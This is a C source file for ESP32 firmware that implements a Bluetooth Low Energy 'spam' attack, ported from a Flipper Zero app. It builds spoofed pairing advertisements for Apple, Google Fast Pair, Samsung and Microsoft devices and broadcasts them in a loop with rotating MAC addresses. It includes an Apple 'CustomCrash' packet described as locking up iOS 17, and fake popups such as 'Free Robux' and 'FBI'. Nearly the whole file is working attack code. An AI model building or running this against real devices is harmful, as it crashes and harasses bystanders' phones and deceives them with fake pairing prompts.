/**
 * @file ble_spam.c
 * @brief BLE spam attack implementation
 *
 * Packet formats ported from the reference Flipper Zero ble_spam app:
 *   Apple Continuity   - @Willy-JL, @ECTO-1A, @Spooks4576
 *   Google Fast Pair   - @Willy-JL, @Spooks4576
 *   Samsung EasySetup  - @Willy-JL, @Spooks4576
 *   Microsoft SwiftPair- @Willy-JL, @Spooks4576
 */

#include "attacks/ble/ble_spam.h"
#include "managers/ble_manager.h"
#include "managers/rgb_manager.h"
#include "managers/status_display_manager.h"
#include "core/glog.h"
#include "esp_random.h"
#include "freertos/semphr.h"
#include "host/ble_gap.h"
#include "host/ble_hs.h"
#include "nimble/ble.h"
#include <string.h>

extern RGBManager_t rgb_manager;

// ============================================================================
// Apple Continuity — device models and action types
// (ported directly from ble_spam/protocols/continuity.c)
// ============================================================================

typedef enum {
    ContinuityTypeProximityPair = 0x07,
    ContinuityTypeNearbyAction  = 0x0F,
    ContinuityTypeCustomCrash   = 0xFF,  // special: re-uses NearbyAction wire type
} ContinuityType;

// 16-bit model codes (big-endian on wire: model_hi then model_lo)
static const uint16_t continuity_pp_models[] = {
    0x0E20, // AirPods Pro
    0x0A20, // AirPods Max
    0x0055, // AirTag
    0x0030, // Hermes AirTag
    0x0220, // AirPods
    0x0F20, // AirPods 2nd Gen
    0x1320, // AirPods 3rd Gen
    0x1420, // AirPods Pro 2nd Gen
    0x1020, // Beats Flex
    0x0620, // Beats Solo 3
    0x0320, // Powerbeats 3
    0x0B20, // Powerbeats Pro
    0x0C20, // Beats Solo Pro
    0x1120, // Beats Studio Buds
    0x0520, // Beats X
    0x0920, // Beats Studio 3
    0x1720, // Beats Studio Pro
    0x1220, // Beats Fit Pro
    0x1620, // Beats Studio Buds+
};
#define CONTINUITY_PP_MODEL_COUNT (sizeof(continuity_pp_models) / sizeof(continuity_pp_models[0]))

static const uint8_t continuity_na_actions[] = {
    0x13, // AppleTV AutoFill
    0x24, // Apple Vision Pro
    0x05, // Apple Watch
    0x27, // AppleTV Connecting...
    0x20, // Join This AppleTV?
    0x19, // AppleTV Audio Sync
    0x1E, // AppleTV Color Balance
    0x09, // Setup New iPhone
    0x2F, // Sign in to other device
    0x02, // Transfer Phone Number
    0x0B, // HomePod Setup
    0x01, // Setup New AppleTV
    0x06, // Pair AppleTV
    0x0D, // HomeKit AppleTV Setup
    0x2B, // AppleID for AppleTV?
};
#define CONTINUITY_NA_ACTION_COUNT (sizeof(continuity_na_actions) / sizeof(continuity_na_actions[0]))

// ============================================================================
// Google Fast Pair — 3-byte model codes
// (ported from ble_spam/protocols/fastpair.c)
// ============================================================================

static const uint32_t fastpair_models[] = {
    // Genuine non-production / forgotten devices
    0x0001F0, // Bisto CSR8670 Dev Board
    0x000047, // Arduino 101
    0x470000, // Arduino 101 2
    0x00000A, // Anti-Spoof Test
    0x0A0000, // Anti-Spoof Test 2
    0x00000B, // Google Gphones
    0x0B0000, // Google Gphones 2
    0x00000D, // Test 00000D
    0x000007, // Android Auto
    0x070000, // Android Auto 2
    0x000009, // Test Android TV
    0x090000, // Test Android TV 2
    0x000048, // Fast Pair Headphones
    0x001000, // LG HBS1110
    0x00B727, // Smart Controller 1
    0x01E5CE, // BLE-Phone
    0x0200F0, // Goodyear
    0x00F7D4, // Smart Setup
    0xF00002, // Goodyear
    0xF00400, // T10
    0x1E89A7, // ATS2833_EVB
    // Phone setup
    0x0577B1, // Galaxy S23 Ultra
    0x05A9BC, // Galaxy S20+
    // Genuine devices
    0xCD8256, // Bose NC 700
    0x0000F0, // Bose QuietComfort 35 II
    0xF00000, // Bose QuietComfort 35 II 2
    0x821F66, // JBL Flip 6
    0xF52494, // JBL Buds Pro
    0x718FA4, // JBL Live 300TWS
    0x0002F0, // JBL Everest 110GA
    0x92BBBD, // Pixel Buds
    0x000006, // Google Pixel Buds
    0x060000, // Google Pixel Buds 2
    0xD446A7, // Sony XM5
    0x2D7A23, // Sony WF-1000XM4
    0x038B91, // DENON AH-C830NCW
    0x02F637, // JBL LIVE FLEX
    0x02D886, // JBL REFLECT MINI NC
    0xF00001, // Bose QuietComfort 35 II
    0xF00201, // JBL Everest 110GA
    0xF00209, // JBL LIVE400BT
    0xF00305, // LG HBS-1500
    0xF00E97, // JBL VIBE BEAM
    0x04ACFC, // JBL WAVE BEAM
    0x04AA91, // Beoplay H4
    0x04AFB8, // JBL TUNE 720BT
    0x05A963, // WONDERBOOM 3
    0x05AA91, // B&O Beoplay E6
    0x05C452, // JBL LIVE220BT
    0x05C95C, // Sony WI-1000X
    0x0602F0, // JBL Everest 310GA
    0x0603F0, // LG HBS-1700
    0x1E8B18, // SRS-XB43
    0x1E955B, // WI-1000XM2
    0x1EC95C, // Sony WF-SP700N
    0x06AE20, // Galaxy S21 5G
    0x06C197, // OPPO Enco Air3 Pro
    0x06C95C, // Sony WH-1000XM2
    0x06D8FC, // soundcore Liberty 4 NC
    0x0744B6, // Technics EAH-AZ60M2
    0x07A41C, // WF-C700N
    0x07C95C, // Sony WH-1000XM2
    0x07F426, // Nest Hub Max
    0x0102F0, // JBL Everest 110GA - Gun Metal
    0x054B2D, // JBL TUNE125TWS
    0x0660D7, // JBL LIVE770NC
    0x0103F0, // LG HBS-835
    0x0903F0, // LG HBS-2000
    0x9ADB11, // Pixel Buds Pro
    0x8B66AB, // Pixel Buds A-Series
    // Custom / fun popups
    0xD99CA1, // Flipper Zero
    0x77FF67, // Free Robux
    0xAA187F, // Free VBucks
    0xDCE9EA, // Rickroll
    0x87B25F, // Animated Rickroll
    0x1448C9, // BLM
    0x13B39D, // Talking Sasquach
    0x7C6CDB, // Obama
    0x005EF9, // Ryanair
    0xE2106F, // FBI
    0xB37A62, // Tesla
    0x92ADC9, // Ton Upgrade Netflix
};
#define FASTPAIR_MODEL_COUNT (sizeof(fastpair_models) / sizeof(fastpair_models[0]))

// ============================================================================
// Samsung EasySetup — buds and watch models
// (ported from ble_spam/protocols/easysetup.c)
// ============================================================================

static const uint32_t samsung_buds_models[] = {
    0xEE7A0C, // Fallback Buds
    0x9D1700, // Fallback Dots
    0x39EA48, // Light Purple Buds2
    0xA7C62C, // Bluish Silver Buds2
    0x850116, // Black Buds Live
    0x3D8F41, // Gray & Black Buds2
    0x3B6D02, // Bluish Chrome Buds2
    0xAE063C, // Gray Beige Buds2
    0xB8B905, // Pure White Buds
    0xEAAA17, // Pure White Buds2
    0xD30704, // Black Buds
    0x9DB006, // French Flag Buds
    0x101F1A, // Dark Purple Buds Live
    0x859608, // Dark Blue Buds
    0x8E4503, // Pink Buds
    0x2C6740, // White & Black Buds2
    0x3F6718, // Bronze Buds Live
    0x42C519, // Red Buds Live
    0xAE073A, // Black & White Buds2
    0x011716, // Sleek Black Buds2
};
#define SAMSUNG_BUDS_MODEL_COUNT (sizeof(samsung_buds_models) / sizeof(samsung_buds_models[0]))

static const uint8_t samsung_watch_models[] = {
    0x1A, // Fallback Watch
    0x01, // White Watch4 Classic 44m
    0x02, // Black Watch4 Classic 40m
    0x03, // White Watch4 Classic 40m
    0x04, // Black Watch4 44mm
    0x05, // Silver Watch4 44mm
    0x06, // Green Watch4 44mm
    0x07, // Black Watch4 40mm
    0x08, // White Watch4 40mm
    0x09, // Gold Watch4 40mm
    0x0A, // French Watch4
    0x0B, // French Watch4 Classic
    0x0C, // Fox Watch5 44mm
    0x11, // Black Watch5 44mm
    0x12, // Sapphire Watch5 44mm
    0x13, // Purpleish Watch5 40mm
    0x14, // Gold Watch5 40mm
    0x15, // Black Watch5 Pro 45mm
    0x16, // Gray Watch5 Pro 45mm
    0x17, // White Watch5 44mm
    0x18, // White & Black Watch5
    0xE4, // Black Watch5 Golf Edition
    0xE5, // White Watch5 Gold Edition
    0x1B, // Black Watch6 Pink 40mm
    0x1C, // Gold Watch6 Gold 40mm
    0x1D, // Silver Watch6 Cyan 44mm
    0x1E, // Black Watch6 Classic 43m
    0x20, // Green Watch6 Classic 43m
    0xEC, // Black Watch6 Golf Edition
    0xEF, // Black Watch6 TB Edition
};
#define SAMSUNG_WATCH_MODEL_COUNT (sizeof(samsung_watch_models) / sizeof(samsung_watch_models[0]))

// ============================================================================
// Local state
// ============================================================================

static volatile uint32_t spam_adv_count  = 0;
static esp_timer_handle_t spam_log_timer = NULL;
static const int spam_log_interval_ms    = 5000;
static TaskHandle_t spam_task_handle     = NULL;
static SemaphoreHandle_t spam_task_exit_sem = NULL;
static volatile bool spam_running        = false;
static ble_spam_type_t current_spam_type = BLE_SPAM_APPLE;

// ============================================================================
// Helpers
// ============================================================================

static const char* spam_type_to_name(ble_spam_type_t type) {
    static const char* const names[] = {
        [BLE_SPAM_MICROSOFT]   = "Microsoft",
        [BLE_SPAM_APPLE]       = "Apple",
        [BLE_SPAM_SAMSUNG]     = "Samsung",
        [BLE_SPAM_GOOGLE]      = "Google",
        [BLE_SPAM_FLIPPERZERO] = "Flipper",
        [BLE_SPAM_RANDOM]      = "Random",
    };
    if (type < sizeof(names) / sizeof(names[0])) return names[type];
    return "Unknown";
}

static void generate_random_mac(uint8_t *mac) {
    esp_fill_random(mac, 6);
    // Static random address: top two bits = 11
    mac[5] |= 0xC0;
    // BLE spec: not all bits in random part can be 0 or 1
    if ((mac[0] | mac[1] | mac[2] | mac[3] | mac[4]) == 0) mac[0] = 0x01;
}

// ============================================================================
// Apple Continuity packet builders
// All three types follow the exact Flipper reference format:
//   [size-1][0xFF][0x4C][0x00][continuity_type][continuity_data_len][...data...]
// ============================================================================

/**
 * ProximityPair (type 0x07)
 * Total AD payload: 6 header + 25 data = 31 bytes
 * Reference: continuity.c ContinuityTypeProximityPair
 */
static size_t build_continuity_proximity_pair(uint8_t *buf) {
    uint8_t model_idx = esp_random() % CONTINUITY_PP_MODEL_COUNT;
    uint16_t model    = continuity_pp_models[model_idx];

    // Pick prefix: 0x05 for AirTag models, 0x07 for new device, 0x01 for not-your-device
    uint8_t prefix;
    if (model == 0x0055 || model == 0x0030)
        prefix = 0x05;
    else
        prefix = (esp_random() % 2) ? 0x07 : 0x01;

    uint8_t color = esp_random() % 16;

    uint8_t i = 0;
    uint8_t total_size = 6 + 25; // header(6) + data(25)

    buf[i++] = total_size - 1;         // AD length field (size minus this byte)
    buf[i++] = 0xFF;                   // AD type: Manufacturer Specific
    buf[i++] = 0x4C;                   // Company ID: Apple Inc. (little-endian)
    buf[i++] = 0x00;
    buf[i++] = ContinuityTypeProximityPair; // 0x07
    buf[i++] = 25;                     // continuity data length

    buf[i++] = prefix;                 // prefix byte (0x01/0x07/0x05)
    buf[i++] = (model >> 8) & 0xFF;   // model high byte
    buf[i++] = (model >> 0) & 0xFF;   // model low byte
    buf[i++] = 0x55;                  // status
    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10); // buds battery
    buf[i++] = ((esp_random() % 8)  << 4) | (esp_random() % 10); // case battery + charge
    buf[i++] = esp_random() & 0xFF;   // lid open counter
    buf[i++] = color;                 // color
    buf[i++] = 0x00;
    // 16-byte encrypted payload
    esp_fill_random(&buf[i], 16);
    i += 16;

    return i; // should be 31
}

/**
 * NearbyAction (type 0x0F)
 * Total AD payload: 6 header + 5 data = 11 bytes
 * Reference: continuity.c ContinuityTypeNearbyAction
 */
static size_t build_continuity_nearby_action(uint8_t *buf) {
    uint8_t action = continuity_na_actions[esp_random() % CONTINUITY_NA_ACTION_COUNT];

    // Flag logic from reference: 0xC0 default, special cases for 0x20 and 0x09
    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;   // more spam for 'Join This AppleTV?'
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40; // glitched 'Setup New Device'

    uint8_t i = 0;
    uint8_t total_size = 6 + 5;

    buf[i++] = total_size - 1;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = ContinuityTypeNearbyAction; // 0x0F
    buf[i++] = 5;                  // continuity data length

    buf[i++] = flags;              // action flags
    buf[i++] = action;             // action type
    esp_fill_random(&buf[i], 3);   // authentication tag
    i += 3;

    return i; // 11
}

/**
 * CustomCrash (iOS 17 lockup — found by @ECTO-1A)
 * Embeds a NearbyAction segment followed by NearbyInfo junk.
 * Total AD payload: 6+5 (NearbyAction) + 2 (terminators) + 4 (NearbyInfo junk) = 17 bytes
 * Reference: continuity.c ContinuityTypeCustomCrash
 */
static size_t build_continuity_custom_crash(uint8_t *buf) {
    uint8_t action = continuity_na_actions[esp_random() % CONTINUITY_NA_ACTION_COUNT];
    uint8_t flags  = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;

    // The crash packet total continuity payload is 11 bytes:
    //   [NearbyAction type][5][flags][action][3 bytes auth]
    //   [0x00][0x00]
    //   [NearbyInfo type][3 random bytes]
    // Wrapped in standard Mfg header: size-1, 0xFF, 0x4C, 0x00
    // Total: 4 (header) + 11 = 15 bytes, but size field = 14

    uint8_t i = 0;
    // Total content after the size byte:
    // 0xFF 0x4C 0x00  = 3
    // [NA type][5][flags][action][3 auth] = 7
    // [0x00][0x00] = 2
    // [NI type][3 junk] = 4
    // total after size byte = 16, so size byte = 16, packet length = 17

    buf[i++] = 16;                          // AD length (total - 1)
    buf[i++] = 0xFF;                        // Manufacturer Specific
    buf[i++] = 0x4C;                        // Apple
    buf[i++] = 0x00;

    buf[i++] = ContinuityTypeNearbyAction;  // 0x0F — continuity type
    buf[i++] = 5;                           // continuity data length
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);            // auth tag
    i += 3;

    buf[i++] = 0x00;                        // additional action data terminator
    buf[i++] = 0x00;

    buf[i++] = 0x10;                        // NearbyInfo continuity type
    esp_fill_random(&buf[i], 3);            // size + shenanigans
    i += 3;

    return i; // 17
}

/**
 * Randomly pick one of the three Apple Continuity packet types.
 * Returns the length of the single raw AD record written into buf.
 */
static size_t build_apple_continuity_adv(uint8_t *buf) {
    switch (esp_random() % 3) {
        case 0:  return build_continuity_proximity_pair(buf);
        case 1:  return build_continuity_nearby_action(buf);
        default: return build_continuity_custom_crash(buf);
    }
}

// ============================================================================
// Google Fast Pair packet builder
// Correct format: 16-bit Service UUID list AD + Service Data AD (UUID 0xFE2C)
// Reference: fastpair.c make_packet
// ============================================================================

static size_t build_fastpair_adv(uint8_t *buf) {
    uint32_t model = fastpair_models[esp_random() % FASTPAIR_MODEL_COUNT];

    uint8_t i = 0;

    // AD record 1: 16-bit UUID list containing 0xFE2C
    buf[i++] = 3;     // length
    buf[i++] = 0x03;  // AD type: Complete List of 16-bit Service UUIDs
    buf[i++] = 0x2C;  // UUID 0xFE2C low byte
    buf[i++] = 0xFE;  // UUID 0xFE2C high byte

    // AD record 2: Service Data for UUID 0xFE2C + 3-byte model
    buf[i++] = 6;     // length
    buf[i++] = 0x16;  // AD type: Service Data
    buf[i++] = 0x2C;  // UUID 0xFE2C low byte
    buf[i++] = 0xFE;  // UUID 0xFE2C high byte
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >>  8) & 0xFF;
    buf[i++] = (model >>  0) & 0xFF;

    // AD record 3: Tx Power Level
    buf[i++] = 2;
    buf[i++] = 0x0A;  // AD type: Tx Power Level
    buf[i++] = (uint8_t)((esp_random() % 120) - 100); // -100 to +19 dBm

    return i; // 14
}

// ============================================================================
// Samsung EasySetup packet builders
// Reference: easysetup.c make_packet
// ============================================================================

/**
 * Samsung Buds popup — 31-byte packet
 * (EasysetupTypeBuds in reference)
 */
static size_t build_samsung_buds_adv(uint8_t *buf) {
    uint32_t model = samsung_buds_models[esp_random() % SAMSUNG_BUDS_MODEL_COUNT];

    uint8_t i = 0;

    // First AD record: 27 bytes of Samsung manufacturer data
    buf[i++] = 27;    // length
    buf[i++] = 0xFF;  // Manufacturer Specific
    buf[i++] = 0x75;  // Samsung Electronics Co. Ltd.
    buf[i++] = 0x00;
    buf[i++] = 0x42;
    buf[i++] = 0x09;
    buf[i++] = 0x81;
    buf[i++] = 0x02;
    buf[i++] = 0x14;
    buf[i++] = 0x15;
    buf[i++] = 0x03;
    buf[i++] = 0x21;
    buf[i++] = 0x01;
    buf[i++] = 0x09;
    buf[i++] = (model >> 16) & 0xFF; // buds model/color byte 0
    buf[i++] = (model >>  8) & 0xFF; // buds model/color byte 1
    buf[i++] = 0x01;                 // always static
    buf[i++] = (model >>  0) & 0xFF; // buds model/color byte 2
    buf[i++] = 0x06;
    buf[i++] = 0x3C;
    buf[i++] = 0x94;
    buf[i++] = 0x8E;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0xC7;
    buf[i++] = 0x00;

    // Second AD record: truncated Samsung header (Android fills rest with zeros)
    buf[i++] = 16;    // length
    buf[i++] = 0xFF;  // Manufacturer Specific
    buf[i++] = 0x75;  // Samsung Electronics Co. Ltd.
    // intentionally truncated — Android fills the rest

    return i; // 31
}

/**
 * Samsung Watch popup — 15-byte packet
 * (EasysetupTypeWatch in reference)
 */
static size_t build_samsung_watch_adv(uint8_t *buf) {
    uint8_t model = samsung_watch_models[esp_random() % SAMSUNG_WATCH_MODEL_COUNT];

    uint8_t i = 0;

    buf[i++] = 14;    // length
    buf[i++] = 0xFF;  // Manufacturer Specific
    buf[i++] = 0x75;  // Samsung
    buf[i++] = 0x00;
    buf[i++] = 0x01;
    buf[i++] = 0x00;
    buf[i++] = 0x02;
    buf[i++] = 0x00;
    buf[i++] = 0x01;
    buf[i++] = 0x01;
    buf[i++] = 0xFF;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x43;
    buf[i++] = model; // watch model/color

    return i; // 15
}

static size_t build_samsung_adv(uint8_t *buf) {
    if (esp_random() % 2)
        return build_samsung_buds_adv(buf);
    else
        return build_samsung_watch_adv(buf);
}

// ============================================================================
// Microsoft SwiftPair packet builder
// Reference: swiftpair.c make_packet
// ============================================================================

static size_t build_swiftpair_adv(uint8_t *buf) {
    // Generate a short random name (printable ASCII)
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    uint8_t name_len = (esp_random() % 7) + 2; // 2..8 chars
    char name[9];
    for (uint8_t n = 0; n < name_len; n++)
        name[n] = charset[esp_random() % (sizeof(charset) - 1)];
    name[name_len] = '\0';

    uint8_t size = 7 + name_len; // total record size including length byte
    uint8_t i = 0;

    buf[i++] = size - 1;   // AD length
    buf[i++] = 0xFF;       // Manufacturer Specific
    buf[i++] = 0x06;       // Microsoft
    buf[i++] = 0x00;
    buf[i++] = 0x03;       // Microsoft Beacon ID
    buf[i++] = 0x00;       // Microsoft Beacon Sub Scenario
    buf[i++] = 0x80;       // Reserved RSSI byte
    memcpy(&buf[i], name, name_len);
    i += name_len;

    return i;
}

// ============================================================================
// Spam log timer
// ============================================================================

static void spam_log_timer_cb(TimerHandle_t xTimer) {
    (void)xTimer;
    glog("BLE Spam (%s): %lu packets sent\n",
         spam_type_to_name(current_spam_type),
         (unsigned long)spam_adv_count);
}

// ============================================================================
// Main spam task
// ============================================================================

static void spam_task(void *arg) {
    (void)arg;

    while (spam_running) {
        // --- Stop any active advertisement ---
        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
            vTaskDelay(pdMS_TO_TICKS(20));
        }

        // --- Rotate MAC (not for Apple — Apple needs stable/public MAC) ---
        bool is_apple = (current_spam_type == BLE_SPAM_APPLE);
        if (!is_apple) {
            uint8_t rnd_addr[6];
            generate_random_mac(rnd_addr);
            int rc = ble_hs_id_set_rnd(rnd_addr);
            if (rc != 0) {
                glog("Warning: Failed to set random address (%d)\n", rc);
            }
        }

        vTaskDelay(pdMS_TO_TICKS(10));

        // --- Build raw advertisement payload ---
        uint8_t adv_data[31];
        size_t adv_len = 0;

        // Flags AD record prefix (3 bytes) — prepended for non-Apple types
        // Apple Continuity packets are already self-contained and do not need
        // a separate Flags record; adding one would push past 31 bytes for
        // some packet types.
        bool need_flags = !is_apple;

        if (need_flags) {
            adv_data[0] = 0x02; // length
            adv_data[1] = 0x01; // AD type: Flags
            adv_data[2] = 0x1A; // LE General Discoverable, BR/EDR not supported
            adv_len = 3;
        }

        // Temporary buffer for the protocol-specific records
        uint8_t proto_buf[31];
        size_t  proto_len = 0;

        switch (current_spam_type) {
            case BLE_SPAM_APPLE:
                // Apple continuity: write directly into adv_data (no flags prefix)
                proto_len = build_apple_continuity_adv(adv_data);
                adv_len   = proto_len;
                break;

            case BLE_SPAM_MICROSOFT:
                proto_len = build_swiftpair_adv(proto_buf);
                break;

            case BLE_SPAM_SAMSUNG:
                proto_len = build_samsung_adv(proto_buf);
                break;

            case BLE_SPAM_GOOGLE:
            case BLE_SPAM_FLIPPERZERO:
                proto_len = build_fastpair_adv(proto_buf);
                break;

            case BLE_SPAM_RANDOM: {
                switch (esp_random() % 4) {
                    case 0: proto_len = build_swiftpair_adv(proto_buf);  break;
                    case 1:
                        // Apple — no flags, write direct
                        proto_len = build_apple_continuity_adv(adv_data);
                        adv_len   = proto_len;
                        need_flags = false;
                        break;
                    case 2: proto_len = build_samsung_adv(proto_buf);    break;
                    case 3: proto_len = build_fastpair_adv(proto_buf);   break;
                }
                break;
            }
        }

        // Append proto_buf to adv_data if we used the flags+proto path
        if (need_flags && proto_len > 0) {
            if (adv_len + proto_len <= 31) {
                memcpy(&adv_data[adv_len], proto_buf, proto_len);
                adv_len += proto_len;
            }
        }

        if (adv_len == 0) {
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }

        // --- Set advertisement data ---
        int rc = ble_gap_adv_set_data(adv_data, adv_len);
        if (rc != 0) {
            glog("Error: Failed to set adv data (%d)\n", rc);
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        // --- Configure advertisement parameters ---
        struct ble_gap_adv_params adv_params;
        memset(&adv_params, 0, sizeof(adv_params));
        adv_params.conn_mode  = BLE_GAP_CONN_MODE_NON;
        adv_params.disc_mode  = is_apple ? BLE_GAP_DISC_MODE_GEN : BLE_GAP_DISC_MODE_NON;
        adv_params.channel_map = 0x07; // all three channels

        // Interval: use 20ms equivalent (0x20 = 20*0.625ms = 12.5ms, close enough)
        // Apple uses slightly slower interval — it doesn't care about speed as much
        if (is_apple) {
            adv_params.itvl_min = 0x30; // ~30ms
            adv_params.itvl_max = 0x40;
        } else {
            adv_params.itvl_min = 0x20; // ~20ms
            adv_params.itvl_max = 0x28;
        }

        uint8_t own_addr_type = is_apple ? BLE_OWN_ADDR_PUBLIC : BLE_OWN_ADDR_RANDOM;

        // Advertise for a short window then rotate
        uint32_t adv_ms = is_apple ? 200 : ((esp_random() % 50) + 50);
        rc = ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL);
        if (rc != 0) {
            glog("Error: Failed to start adv (%d)\n", rc);
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        spam_adv_count++;

        // Wait for advertisement window to expire
        vTaskDelay(pdMS_TO_TICKS(adv_ms + 20));

        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
        }

        // Short idle before next packet — mimic 20ms Flipper default
        uint32_t idle_ms = is_apple ? 15 : 20;
        vTaskDelay(pdMS_TO_TICKS(idle_ms));
    }

    if (ble_is_initialized() && ble_gap_adv_active()) {
        ble_gap_adv_stop();
    }

    if (spam_task_handle == xTaskGetCurrentTaskHandle()) {
        spam_task_handle = NULL;
    }

    if (spam_task_exit_sem != NULL) {
        xSemaphoreGive(spam_task_exit_sem);
    }

    vTaskDelete(NULL);
}

// ============================================================================
// Public API
// ============================================================================

void ble_spam_start(ble_spam_type_t type) {
    if (spam_running) {
        glog("Spam already running, stopping first...\n");
        ble_spam_stop();
    }

    if (spam_task_handle != NULL) {
        if (eTaskGetState(spam_task_handle) != eDeleted) {
            ble_spam_stop();
        }
        spam_task_handle = NULL;
    }

    if (spam_task_exit_sem == NULL) {
        spam_task_exit_sem = xSemaphoreCreateBinary();
    }
    if (spam_task_exit_sem != NULL) {
        (void)xSemaphoreTake(spam_task_exit_sem, 0);
    }

    if (!ble_is_initialized()) ble_init();
    if (!ble_wait_for_ready()) {
        glog("BLE not ready for spam\n");
        return;
    }

    current_spam_type = type;
    spam_adv_count    = 0;
    spam_running      = true;

    BaseType_t res = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &spam_task_handle);
    if (res != pdPASS) {
        glog("Failed to create spam task (%d)\n", res);
        spam_running     = false;
        spam_task_handle = NULL;
        return;
    }

    if (spam_log_timer == NULL) {
        esp_timer_create_args_t targs = {
            .callback = spam_log_timer_cb,
            .arg      = NULL,
            .name     = "spam_log"
        };
        esp_timer_create(&targs, &spam_log_timer);
    }
    if (spam_log_timer != NULL) {
        esp_timer_start_periodic(spam_log_timer, (uint64_t)spam_log_interval_ms * 1000);
    }

    glog("BLE Spam started (%s)\n", spam_type_to_name(type));
    status_display_show_status("BLE Spam On");
}

void ble_spam_stop(void) {
    bool task_was_running = (spam_task_handle != NULL);
    if (!spam_running && !task_was_running) {
        return;
    }

    spam_running = false;

    if (spam_log_timer) {
        esp_timer_stop(spam_log_timer);
    }

    if (ble_is_initialized() && ble_gap_adv_active()) {
        ble_gap_adv_stop();
    }

    if (task_was_running) {
        bool task_exited = false;
        if (spam_task_exit_sem != NULL) {
            task_exited = (xSemaphoreTake(spam_task_exit_sem, pdMS_TO_TICKS(750)) == pdTRUE);
        } else {
            vTaskDelay(pdMS_TO_TICKS(100));
        }

        if (!task_exited && spam_task_handle != NULL && eTaskGetState(spam_task_handle) != eDeleted) {
            glog("BLE spam task exit timed out, forcing stop\n");
            vTaskDelete(spam_task_handle);
            spam_task_handle = NULL;
        }
    }

    glog("BLE Spam stopped\n");
    status_display_show_status("BLE Spam Off");
}

bool ble_spam_is_running(void) {
    return spam_running;
}
